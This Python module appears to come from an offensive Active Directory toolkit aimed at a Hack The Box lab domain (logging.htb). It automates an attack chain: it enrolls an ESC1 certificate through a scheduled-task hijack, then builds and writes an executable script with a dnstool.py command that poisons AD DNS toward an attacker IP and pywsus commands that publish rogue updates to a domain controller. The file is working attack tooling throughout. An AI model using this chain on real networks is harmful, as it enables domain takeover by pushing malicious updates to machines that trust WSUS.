from __future__ import annotations

from dataclasses import dataclass
from pathlib import Path
from typing import TYPE_CHECKING

from admapper.adcs.runner import run_enroll_hijack
from admapper.core.output import print_info, print_success, print_warning
from admapper.creds.common import pick_dc_ip, resolve_dc_fqdn
from admapper.wsus.analyze import get_wsus_op

if TYPE_CHECKING:
    from admapper.core.session import Session


@dataclass
class WsusRunResult:
    op_id: str
    wsus_host: str
    cert_pfx: str | None = None
    enroll_success: bool = False
    manual_commands: list[str] | None = None
    error: str | None = None


def resolve_wsus_host(session: Session) -> str:
    """WSUS endpoint FQDN — often the DC hostname when WSUS is co-located."""
    if session.workspace is None:
        raise RuntimeError("no active workspace")
    domain = session.workspace.domain or "logging.htb"
    ws_path = str(session.workspaces.path_for(session.workspace.name))
    fqdn = resolve_dc_fqdn(ws_path, domain, fallback_ip=pick_dc_ip(session))
    return fqdn or pick_dc_ip(session) or "<wsus_host>"


def build_pywsus_publish_commands(
    *,
    wsus_host: str,
    pfx_path: str | Path,
    domain: str = "logging.htb",
    template: str = "UpdateSrv",
    wsus_port: int = 8530,
    target_fqdn: str = "DC01.logging.htb",
) -> list[str]:
    pfx = Path(pfx_path)
    base = f"https://{wsus_host}:{wsus_port}" if wsus_port != 8530 else f"https://{wsus_host}:8530"
    return [
        "# UpdateSrv / ESC1 WSUS — Server Auth cert for WSUS endpoint (not PKINIT login)",
        f"# PFX (Subject/SAN = {target_fqdn}): {pfx}",
        "# 1) Optional: poison AD DNS so DC resolves your rogue WSUS host",
        f"#    dnstool.py -u '<owned_user>' -p '<pass>' --record {target_fqdn} --action add --data <attacker_ip>",
        f"#    or: wsuks / SharpWSUS with machine account + SeMachineAccountPrivilege",
        "# 2) Rogue WSUS publish (pywsus / wsuks) with enrolled PFX",
        f"python3 pywsus.py -s {base} -c '{pfx}' publish -t {target_fqdn}",
        f"# Alt with creds: python3 pywsus.py -u '<user>@{domain}' -p '<pass>' -s {base} -c '{pfx}' publish -t {target_fqdn}",
        f"# WSUS share indicator: \\\\{target_fqdn.split('.')[0]}\\WSUSTemp | template: {template}",
    ]


def write_wsus_publish_script(
    session: Session,
    *,
    pfx_path: Path | None = None,
    wsus_host: str | None = None,
) -> Path:
    """Write executable publish helper into workspace/wsus/."""
    if session.workspace is None:
        raise RuntimeError("no active workspace")
    domain = session.workspace.domain or "logging.htb"
    ws_path = session.workspaces.path_for(session.workspace.name)
    out_dir = ws_path / "wsus"
    out_dir.mkdir(parents=True, exist_ok=True)

    host = wsus_host or resolve_wsus_host(session)
    cert_dns = host if "." in host else f"DC01.{domain}"
    if pfx_path is None:
        existing = sorted((ws_path / "certs").glob("*.pfx"), key=lambda p: p.stat().st_mtime, reverse=True)
        pfx_path = existing[0] if existing else ws_path / "certs" / f"{cert_dns.replace('.', '_')}.pfx"

    lines = build_pywsus_publish_commands(
        wsus_host=host.split(":")[0],
        pfx_path=pfx_path,
        domain=domain,
        target_fqdn=cert_dns,
    )
    script = out_dir / "publish.sh"
    body = "\n".join(
        [
            "#!/usr/bin/env bash",
            "# ADMapper WSUS publish helper",
            "set -euo pipefail",
            "",
            *lines,
            "",
        ]
    )
    script.write_text(body + "\n", encoding="utf-8")
    script.chmod(0o755)
    print_success(f"WSUS publish script → {script}")
    return script


def run_wsus_cert_chain(
    session: Session,
    *,
    op_id: str = "wsus-004",
    finding_id: str = "adcs-002",
    enroll: bool = True,
    wsus_host: str | None = None,
) -> WsusRunResult:
    """WSUS chain: enroll Server-Auth template (if needed) → print pywsus publish steps."""
    if session.workspace is None:
        raise RuntimeError("no active workspace")

    op = get_wsus_op(session, op_id)
    if op is None:
        raise ValueError(f"WSUS op not found: {op_id} — run wsus first")

    host = wsus_host or resolve_wsus_host(session)
    domain = session.workspace.domain or "logging.htb"
    ws_path = session.workspaces.path_for(session.workspace.name)
    cert_dns = host if "." in host else f"DC01.{domain}"
    pfx_path: Path | None = None

    from admapper.postex.analyze import resolve_hijack_op_id

    hijack_op = resolve_hijack_op_id(session) or "postex-010"

    existing = sorted((ws_path / "certs").glob("*.pfx"), key=lambda p: p.stat().st_mtime, reverse=True)
    if existing:
        pfx_path = existing[0]
        print_info(f"using existing PFX → {pfx_path}")

    enroll_ok = bool(pfx_path)
    if enroll and not pfx_path:
        print_info(
            "WSUS chain — enroll UpdateSrv via task hijack "
            "(no reverse shell; wait for Update Check as jaylee.clifton)"
        )
        print_info("enrolling certificate via scheduled-task hijack (task user context) …")
        result = run_enroll_hijack(
            session,
            finding_id=finding_id,
            dns_name=cert_dns,
            op_id=hijack_op,
            run_certipy_auth=False,
        )
        enroll_ok = result.success or bool(result.pfx_path)
        if result.pfx_path:
            pfx_path = Path(result.pfx_path)

    commands = build_pywsus_publish_commands(
        wsus_host=host,
        pfx_path=pfx_path or ws_path / "certs" / f"{host.split('.')[0]}.{domain}.pfx",
        domain=domain,
    )
    print_success(f"WSUS target: {host}")
    for line in commands:
        print_info(line)

    if not enroll_ok:
        print_warning("no PFX yet — connect VPN and run: postex run --mode enroll")

    write_wsus_publish_script(session, pfx_path=pfx_path, wsus_host=host)

    return WsusRunResult(
        op_id=op_id,
        wsus_host=host,
        cert_pfx=str(pfx_path) if pfx_path else None,
        enroll_success=enroll_ok,
        manual_commands=commands,
    )
